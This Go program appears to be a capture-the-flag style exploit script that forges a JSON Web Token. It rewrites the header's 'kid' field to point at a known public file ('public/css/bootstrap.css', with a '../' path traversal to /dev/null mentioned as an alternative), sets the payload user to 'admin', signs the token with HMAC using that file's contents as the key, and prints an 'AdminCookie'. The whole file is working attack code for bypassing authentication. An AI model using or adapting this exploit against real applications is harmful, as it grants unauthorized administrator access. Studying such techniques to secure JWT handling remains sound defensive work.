package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"
)

func main() {
	// cookie auth cookie
	cookieAuthToken := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"

	parts := strings.Split(cookieAuthToken, ".")

	// Extracting the header
	headerBytes, err := base64.StdEncoding.DecodeString(parts[0] + "==")
	if err != nil {
		fmt.Println("[headerBytes] unexpected error: ", err)
	}
	var headerMap map[string]interface{}
	err = json.Unmarshal(headerBytes, &headerMap)
	if err != nil {
		fmt.Println("[headerMap]unexpected error: ", err)
	}

	// Modifying the kid param
	// ../../../../../../dev/null can also be used
	// Reading the file /dev/null return an empty string (secretKey="")
	headerMap["kid"] = "public/css/bootstrap.css"

	newHeaderBytes, err := json.Marshal(headerMap)
	if err != nil {
		fmt.Println("[newHeaderBytes]unexpected error: ", err)
	}
	newHeader := base64.StdEncoding.EncodeToString(newHeaderBytes)

	// Extracting the payload
	payloadBytes, err := base64.StdEncoding.DecodeString(parts[1] + "==")
	if err != nil {
		fmt.Println("[payloadBytes] unexpected error: ", err)
	}
	var payloadMap map[string]interface{}
	err = json.Unmarshal(payloadBytes, &payloadMap)
	if err != nil {
		fmt.Println("[payloadMap]unexpected error: ", err)
	}

	// Modifying the user
	payloadMap["user"] = "admin"
	newPayloadBytes, err := json.Marshal(payloadMap)
	if err != nil {
		fmt.Println("[newPayloadBytes]unexpected error: ", err)
	}
	newPayload := base64.StdEncoding.EncodeToString(newPayloadBytes)

	secretKey, err := os.ReadFile("./bootstrap.css")
	if err != nil {
		fmt.Println("[secretKey]unexpected error: ", err)
	}

	cleanedHeader := strings.ReplaceAll(newHeader, "=", "")
	cleanedPayload := strings.ReplaceAll(newPayload, "=", "")

	// Generating the signature
	mac := hmac.New(sha256.New, secretKey)
	mac.Write([]byte(cleanedHeader + "." + cleanedPayload))
	signature := base64.StdEncoding.EncodeToString(mac.Sum(nil))

	fmt.Println("AdminCookie => " + cleanedHeader + "." + cleanedPayload + "." + strings.ReplaceAll(signature, "=", ""))
}
